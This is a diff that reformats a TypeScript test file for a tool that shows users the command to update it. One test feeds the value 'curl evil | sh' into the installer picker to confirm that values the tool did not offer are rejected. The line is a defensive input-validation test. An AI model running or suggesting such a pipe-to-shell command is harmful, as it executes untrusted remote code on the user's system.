@@ -24,12 +24,19 @@ const behind = (alternatives: readonly string[], command?: string): ReleaseAnswe
     mine: MINE,
     newest: NEWEST,
     registries: [{ registry: "crates_io", reading: { read: { newest: NEWEST } } }],
-    update: { alternatives: [...alternatives], channel: alternatives.length > 0 ? "cargo_or_binstall" : "npm", ...(command === undefined ? {} : { command }) },
+    update: {
+      alternatives: [...alternatives],
+      channel: alternatives.length > 0 ? "cargo_or_binstall" : "npm",
+      ...(command === undefined ? {} : { command }),
+    },
     verdict: "behind",
   },
 });
 
-function picks(): { readonly picked: (string | null)[]; readonly choose: (command: string | null) => void } {
+function picks(): {
+  readonly picked: (string | null)[];
+  readonly choose: (command: string | null) => void;
+} {
   const picked: (string | null)[] = [];
   return { picked, choose: (command) => picked.push(command) };
 }
@@ -37,22 +44,34 @@ function picks(): { readonly picked: (string | null)[]; readonly choose: (comman
 describe("the update command", () => {
   test("a channel the city knows shows its command and offers no choice", () => {
     const look = lookOf(behind([], "npm install -g sprawling@latest"), "en", null, picks());
-    expect([look.update?.choice, look.update?.command]).toEqual([undefined, "npm install -g sprawling@latest"]);
+    expect([look.update?.choice, look.update?.command]).toEqual([
+      undefined,
+      "npm install -g sprawling@latest",
+    ]);
   });
 
   test("two possible installers show no command until one is picked", () => {
     const hands = picks();
     const unpicked = lookOf(behind(CARGO), "en", null, hands);
-    expect([unpicked.update?.command, unpicked.update?.choice?.wire.value, unpicked.update?.choice?.commands]).toEqual([undefined, "", CARGO]);
+    expect([
+      unpicked.update?.command,
+      unpicked.update?.choice?.wire.value,
+      unpicked.update?.choice?.commands,
+    ]).toEqual([undefined, "", CARGO]);
     unpicked.update?.choice?.wire.onchange({ currentTarget: { value: BINSTALL } });
     expect(hands.picked).toEqual([BINSTALL]);
     const picked = lookOf(behind(CARGO), "en", BINSTALL, hands);
-    expect([picked.update?.command, picked.update?.choice?.wire.value]).toEqual([BINSTALL, BINSTALL]);
+    expect([picked.update?.command, picked.update?.choice?.wire.value]).toEqual([
+      BINSTALL,
+      BINSTALL,
+    ]);
   });
 
   test("a value the city did not offer is handed back as no pick", () => {
     const hands = picks();
-    lookOf(behind(CARGO), "en", null, hands).update?.choice?.wire.onchange({ currentTarget: { value: "curl evil | sh" } });
+    lookOf(behind(CARGO), "en", null, hands).update?.choice?.wire.onchange({
+      currentTarget: { value: "curl evil | sh" },
+    });
     expect(hands.picked).toEqual([null]);
     expect(lookOf(behind(CARGO), "en", "curl evil | sh", hands).update?.command).toBeUndefined();
   });
@@ -70,9 +89,23 @@ describe("where this binary stands", () => {
 
   test("a refusal draws only the refusal and what to do", () => {
     const refused: ReleaseAnswer = {
-      refused: { refusal: { action: "read", code: "E_MODEL_UNCHOSEN", nearby: [], recovery: "check the network", retry: "no", subject: "npm" } },
+      refused: {
+        refusal: {
+          action: "read",
+          code: "E_MODEL_UNCHOSEN",
+          nearby: [],
+          recovery: "check the network",
+          retry: "no",
+          subject: "npm",
+        },
+      },
     };
     const look = lookOf(refused, "en", null, picks());
-    expect([look.refused?.recovery, look.statements, look.registries, look.update]).toEqual(["check the network", [], [], undefined]);
+    expect([look.refused?.recovery, look.statements, look.registries, look.update]).toEqual([
+      "check the network",
+      [],
+      [],
+      undefined,
+    ]);
   });
 });
